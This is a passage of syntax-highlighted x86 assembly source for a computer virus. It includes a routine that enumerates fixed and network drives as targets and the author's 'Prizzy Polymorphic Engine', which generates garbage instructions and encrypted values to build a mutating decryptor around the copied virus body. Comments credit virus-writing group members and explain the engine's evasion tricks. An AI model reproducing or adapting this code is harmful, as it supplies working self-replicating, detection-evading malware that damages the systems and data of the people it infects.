        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">       </span><span class="sc1">;DISK_FIXED flag</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gd_found</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;DISK_REMOTE (network) flag</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gd_found</span><span class="sc0">

    </span><span class="sc5">__gd_new_disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gd_finish</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gd_search</span><span class="sc0">

    </span><span class="sc5">__gd_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">;convert to BCD</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gd_new_disk</span><span class="sc0">

    </span><span class="sc5">__gd_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt_flags</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc13">'A:\',0
</span><span class="sc0">
</span><span class="sc1">;ÄÄÄ´ Prizzy Polymorphic Engine (PPE) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Welcome to my Prizzy Polymorphic Engine (PPE).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;I would like to thank GriYo/29A because I understood</span><span class="sc0">
        </span><span class="sc1">;principle of the polymorphic's tables. In return I coded</span><span class="sc0">
        </span><span class="sc1">;many interesting function with Coprocessor and MMX.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Total instructions which I can generate are:</span><span class="sc0">
        </span><span class="sc1">;   * 149 type of base-instructions (37 from GriYo/29A)</span><span class="sc0">
        </span><span class="sc1">;   * 43  type of copro-instructions</span><span class="sc0">
        </span><span class="sc1">;   * 46  type of MMX-instructions</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;     base-instr      copro-instr       MMX-instr</span><span class="sc0">
        </span><span class="sc1">;    ------------    -------------         -----------</span><span class="sc0">
        </span><span class="sc1">; (clc,stc,cmc,cld...)  (fst,fist w/d/q...)  (movd,movq,...)</span><span class="sc0">
        </span><span class="sc1">; mov reg(32,16,8),imm  (fld,fild w/d/q...)  (packssdw  ...)</span><span class="sc0">
        </span><span class="sc1">; mov reg(32,16,8),reg  (fldl2t,fldl2e ...)  (punpckhbw ...)</span><span class="sc0">
        </span><span class="sc1">; (add,sub...) reg,imm  (fadd,fiadd w/d/q.)  (pcmpeqb   ...)</span><span class="sc0">
        </span><span class="sc1">; (xor,adc...) reg,reg  (fsub,fisub w/d/q.)  (psrlw,psrrlq.)</span><span class="sc0">
        </span><span class="sc1">; push + garbage + pop  (fsin,fcos,fpatan.)  (psraw,psrad..)</span><span class="sc0">
        </span><span class="sc1">; call + garbage + pop  (fabs,fnop,fxch...)  (psllw,psslq..)</span><span class="sc0">
        </span><span class="sc1">; jmp + rnd_data    (ftst,fxam,fsqrt..)  (pand,pxor ...)</span><span class="sc0">
        </span><span class="sc1">; jmp conditional                (pmaddwd   ...)</span><span class="sc0">
        </span><span class="sc1">; mov(sx.zx) reg,reg                 (paddb,paddd..)</span><span class="sc0">
        </span><span class="sc1">; (rcr,sal...) reg,imm               (paddsb    ...)</span><span class="sc0">
        </span><span class="sc1">; (rol,shr...) reg,reg               (paddusw   ...)</span><span class="sc0">
        </span><span class="sc1">; (bsf,bsr...) reg,imm               (psubb,psubd..)</span><span class="sc0">
        </span><span class="sc1">; (btc,bts...) reg,reg               (psubsw    ...)</span><span class="sc0">
        </span><span class="sc1">; (seta,setp,setg ...)               (psubusw   ...)</span><span class="sc0">
        </span><span class="sc1">; garbage + (loope...)</span><span class="sc0">
        </span><span class="sc1">; garbage + dec + jnz</span><span class="sc0">
        </span><span class="sc1">; gen reg + cjmp reg32</span><span class="sc0">
        </span><span class="sc1">; gen reg + rep(lods.)</span><span class="sc0">
        </span><span class="sc1">; push val+garbage+pop</span><span class="sc0">
        </span><span class="sc1">; gen rnd32 + crypt     this is only part of reality ...</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; I can generate garbage instructions which they will not</span><span class="sc0">
        </span><span class="sc1">; modify flags (useful for MMX and JNZ work).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; I did function which can crypt a original value in reg32.</span><span class="sc0">
        </span><span class="sc1">; for example: I can get 0x12345678 value to ESI, it will</span><span class="sc0">
        </span><span class="sc1">; be crypted :      MOV     EAX, 38C407D6h</span><span class="sc0">
        </span><span class="sc1">;           ADD     EAX, C73Bf82Ah</span><span class="sc0">
        </span><span class="sc1">;           MOV     EDX, EAX</span><span class="sc0">
        </span><span class="sc1">;           NOT     EDX</span><span class="sc0">
        </span><span class="sc1">;           MOV     ESI, EDX</span><span class="sc0">
        </span><span class="sc1">;           XOR     ESI, 7FD02C6Ah -&gt; ESI=12345678h</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; The very interesting is test which I find out if computer</span><span class="sc0">
        </span><span class="sc1">; supports MMX - and it'll get over CPUID - and supports one ?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; Also I don't know if I must inicialize coprocessor or MMX</span><span class="sc0">
        </span><span class="sc1">; but when I was debugging WinAMP plugins, he DO NOT inicia-</span><span class="sc0">
        </span><span class="sc1">; lize ones. So I think it isn't necessary - believe me.</span><span class="sc0">
        </span><span class="sc1">; But now, two days later, I find out that SoftICE wants</span><span class="sc0">
        </span><span class="sc1">; inicialized these regs.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; And finally my awful shock. I found out If I have got a</span><span class="sc0">
        </span><span class="sc1">; qword value in copro-reg and I wanna read dword via FILD,</span><span class="sc0">
        </span><span class="sc1">; copro put to memory 0x80000000 value instead low-dword</span><span class="sc0">
        </span><span class="sc1">; value - although I hooped in. But what can I do with it ?</span><span class="sc0">
        </span><span class="sc1">; In the end I had to REMOVE code-operation through copro.</span><span class="sc0">
        </span><span class="sc1">; I don't know how else to solve this problem - try it !</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; I hope the comments are enough to guide you through...</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ppe_st_flags</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;input of tbl_encode_loop</span><span class="sc0">
        </span><span class="sc5">__ppe_st_items</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;items in table</span><span class="sc0">
        </span><span class="sc5">__ppe_st_o_table</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;offset to the table (part)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_startup</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; clear table of registers (base/copro/mmx)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs_mmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs_copro</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_lmmx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_back</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_get</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc1">; set style of the garbages</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc5">USED_BASED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">USED_FLAGS</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">USED_COPRO</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">USED_MMX</span><span class="sc0">

        </span><span class="sc1">; copy the body of our virus to buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; load address of the start of poly-decoder</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; clear table</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000006h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_encode_loop</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__ppes_clear_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc5">__ppes_clear_item</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_clear_item</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_clear_table</span><span class="sc0">

        </span><span class="sc1">; I'm gonna write a flag which will be mean that global</span><span class="sc0">
        </span><span class="sc1">; index reg ain't generated yet.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc1">; index_reg/code_reg/counter_reg will in copro or mmx ?</span><span class="sc0">
    </span><span class="sc5">__ppes_new_style</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_or_mmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; get index_reg --&gt; (xor,sub...) [index_reg], reg32</span><span class="sc0">
    </span><span class="sc5">__ppes_new_ireg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_valid_reg</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_test_reg</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_new_ireg</span><span class="sc0">
    </span><span class="sc5">__ppes_test_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_set_valid_reg</span><span class="sc0">

        </span><span class="sc1">; get code_reg --&gt; (xor,sub...) [---], code_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; get counter_reg --&gt; dec counter_reg, jnz ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_valid_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_set_valid_reg</span><span class="sc0">

        </span><span class="sc1">; 'cause we have few registers I can't have got all idx in base</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_okay</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_okay</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppes_new_style</span><span class="sc0">
    </span><span class="sc5">__ppes_okay</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; choose subroutine</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000006h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_encode_loop</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__ppes_choose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;AH=random?, AL=items</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_flags</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_items</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_o_table</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">;random ? JZ if not</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_crun</span><span class="sc0">
    </span><span class="sc5">__ppes_cnext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_o_table</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_items</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_cnext</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__ppes_crun</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">;already generated byte...</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;already generated flag</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_flags</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppes_ccmp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_flags</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppes_cnext</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppes_crun</span><span class="sc0">
    </span><span class="sc5">__ppes_ccmp</span><span class="sc4">:</span><span class="sc0">
